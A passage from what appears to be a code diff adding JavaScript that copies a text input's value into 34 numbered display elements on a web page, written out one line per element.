+            var displayElement1 = document.getElementById('githubdisplayText1');
+            var displayElement2 = document.getElementById('githubdisplayText2');
+            var displayElement3 = document.getElementById('githubdisplayText3');
+            var displayElement4 = document.getElementById('githubdisplayText4');
+            var displayElement5 = document.getElementById('githubdisplayText5');
+            var displayElement6 = document.getElementById('githubdisplayText6');
+            var displayElement7 = document.getElementById('githubdisplayText7');
+            var displayElement8 = document.getElementById('githubdisplayText8');
+            var displayElement9 = document.getElementById('githubdisplayText9');
+            var displayElement10 = document.getElementById('githubdisplayText10');
+            var displayElement11 = document.getElementById('githubdisplayText11');
+            var displayElement12 = document.getElementById('githubdisplayText12');
+            var displayElement13 = document.getElementById('githubdisplayText13');
+            var displayElement14 = document.getElementById('githubdisplayText14');
+            var displayElement15 = document.getElementById('githubdisplayText15');
+            var displayElement16 = document.getElementById('githubdisplayText16');
+            var displayElement17 = document.getElementById('githubdisplayText17');
+            var displayElement18 = document.getElementById('githubdisplayText18');
+            var displayElement19 = document.getElementById('githubdisplayText19');
+            var displayElement20 = document.getElementById('githubdisplayText20');
+            var displayElement21 = document.getElementById('githubdisplayText21');
+            var displayElement22 = document.getElementById('githubdisplayText22');
+            var displayElement23 = document.getElementById('githubdisplayText23');
+            var displayElement24 = document.getElementById('githubdisplayText24');
+            var displayElement25 = document.getElementById('githubdisplayText25');
+            var displayElement26 = document.getElementById('githubdisplayText26');
+            var displayElement27 = document.getElementById('githubdisplayText27');
+            var displayElement28 = document.getElementById('githubdisplayText28');
+            var displayElement29 = document.getElementById('githubdisplayText29');
+            var displayElement30 = document.getElementById('githubdisplayText30');
+            var displayElement31 = document.getElementById('githubdisplayText31');
+            var displayElement32 = document.getElementById('githubdisplayText32');
+            var displayElement33 = document.getElementById('githubdisplayText33');
+            var displayElement34 = document.getElementById('githubdisplayText34');
+
+            displayElement1.textContent = githubinputText.value;
+            displayElement2.textContent = githubinputText.value;
+            displayElement3.textContent = githubinputText.value;
+            displayElement4.textContent = githubinputText.value;
+            displayElement5.textContent = githubinputText.value;
+            displayElement6.textContent = githubinputText.value;
+            displayElement7.textContent = githubinputText.value;
+            displayElement8.textContent = githubinputText.value;
+            displayElement9.textContent = githubinputText.value;
+            displayElement10.textContent = githubinputText.value;
+            displayElement11.textContent = githubinputText.value;
+            displayElement12.textContent = githubinputText.value;
+            displayElement13.textContent = githubinputText.value;
+            displayElement14.textContent = githubinputText.value;
+            displayElement15.textContent = githubinputText.value;
+            displayElement16.textContent = githubinputText.value;
+            displayElement17.textContent = githubinputText.value;
+            displayElement18.textContent = githubinputText.value;
+            displayElement19.textContent = githubinputText.value;
+            displayElement20.textContent = githubinputText.value;
+            displayElement21.textContent = githubinputText.value;
+            displayElement22.textContent = githubinputText.value;
+            displayElement23.textContent = githubinputText.value;
+            displayElement24.textContent = githubinputText.value;
+            displayElement25.textContent = githubinputText.value;
+            displayElement26.textContent = githubinputText.value;
+            displayElement27.textContent = githubinputText.value;
+            displayElement28.textContent = githubinputText.value;
+            displayElement29.textContent = githubinputText.value;
+            displayElement30.textContent = githubinputText.value;
+            displayElement31.textContent = githubinputText.value;
+            displayElement32.textContent = githubinputText.value;
+            displayElement33.textContent = githubinputText.value;
+            displayElement34.textContent = githubinputText.value;
+        }
+
     </script>
 
 </body>
